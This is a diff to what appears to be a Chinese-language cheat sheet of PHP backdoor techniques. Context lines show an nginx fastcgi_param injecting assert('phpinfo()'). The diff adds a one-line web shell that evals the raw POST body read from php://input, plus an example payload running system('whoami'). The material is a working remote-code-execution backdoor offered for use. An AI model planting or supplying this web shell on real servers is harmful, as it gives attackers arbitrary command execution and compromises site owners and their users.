@@ -458,3 +458,12 @@ fastcgi_param  HTTP_X_CURRENT     assert('phpinfo()');
 ```
 
 reload nginx后，即可执行phpinfo
+
+## `php://input`
+
+
+```php
+<?php eval('?>' . file_get_contents('php://input'));
+```
+
+可执行php代码，post方式提交`<?php system("whoami"); ?>`
